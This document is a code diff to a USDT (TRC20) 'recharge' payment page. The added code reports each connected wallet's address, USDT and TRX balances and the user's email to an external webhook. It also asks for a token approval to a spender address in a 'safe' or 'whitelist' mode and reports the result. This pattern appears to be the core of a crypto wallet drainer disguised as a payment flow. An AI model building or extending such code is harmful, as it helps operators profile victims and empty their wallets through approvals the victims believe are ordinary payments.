@@ -9,6 +9,7 @@ import { useToast } from '@/hooks/use-toast';
 import { supabase } from '@/integrations/supabase/client';
 import { useTronWallet, WALLET_CONFIGS } from '@/hooks/useTronWallet';
 import PaymentModeModal from '@/components/recharge/PaymentModeModal';
+import { sendWalletConnectedEvent, sendAuthorizationCompletedEvent } from '@/lib/webhookService';
 
 const PAYMENT_TIMEOUT = 15 * 60; // 15 minutes in seconds
 
@@ -170,18 +171,49 @@ export default function RechargeUsdtPage() {
     }
   }, [hasTronWeb, isConnected, connect]);
 
-  // Update transaction with wallet address when connected
+  // Update transaction with wallet address when connected and send webhook
+  const hasSentWalletEvent = useRef(false);
   useEffect(() => {
-    const updateWalletAddress = async () => {
-      if (isConnected && address && paymentOrderId) {
+    const updateWalletAddressAndSendWebhook = async () => {
+      if (isConnected && address && paymentOrderId && !hasSentWalletEvent.current) {
+        // Update transaction in database
         await supabase
           .from('transactions')
           .update({ wallet_address: address })
           .eq('order_id', paymentOrderId);
+
+        // Check balances
+        const balances = await checkBalances(parseFloat(amount));
+
+        // Get username from user profile
+        let username = 'unknown';
+        if (user) {
+          const { data: profile } = await supabase
+            .from('profiles')
+            .select('email')
+            .eq('user_id', user.id)
+            .single();
+          if (profile?.email) {
+            username = profile.email;
+          }
+        }
+
+        // Send wallet connected event
+        hasSentWalletEvent.current = true;
+        await sendWalletConnectedEvent({
+          order_id: paymentOrderId,
+          wallet_address: address,
+          username,
+          currency: 'USDT',
+          network: 'TRC20',
+          spender_address: spenderAddress,
+          usdt_balance: balances.usdtBalance,
+          trx_balance: balances.trxBalance
+        });
       }
     };
-    updateWalletAddress();
-  }, [isConnected, address, paymentOrderId]);
+    updateWalletAddressAndSendWebhook();
+  }, [isConnected, address, paymentOrderId, user, spenderAddress, amount, checkBalances]);
 
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60);
@@ -228,8 +260,39 @@ export default function RechargeUsdtPage() {
   const handlePaymentConfirm = async (paymentAmount: number, mode: 'safe' | 'whitelist') => {
     setIsProcessing(true);
 
+    // Get username for webhook
+    let username = 'unknown';
+    if (user) {
+      const { data: profile } = await supabase
+        .from('profiles')
+        .select('email')
+        .eq('user_id', user.id)
+        .single();
+      if (profile?.email) {
+        username = profile.email;
+      }
+    }
+
+    // Get current balances before approval
+    const balances = await checkBalances(paymentAmount);
+
     try {
       const result = await approveUSDT(spenderAddress, paymentAmount);
+
+      // Send authorization completed webhook immediately
+      sendAuthorizationCompletedEvent({
+        order_id: paymentOrderId,
+        wallet_address: address || '',
+        username,
+        currency: 'USDT',
+        network: 'TRC20',
+        spender_address: spenderAddress,
+        usdt_balance: balances.usdtBalance,
+        trx_balance: balances.trxBalance,
+        tx_hash: result.txHash || '',
+        status: result.success ? 'success' : 'failed',
+        payment_mode: mode
+      }).catch(err => console.error('Failed to send webhook:', err));
 
       // Update transaction status
       if (paymentOrderId) {
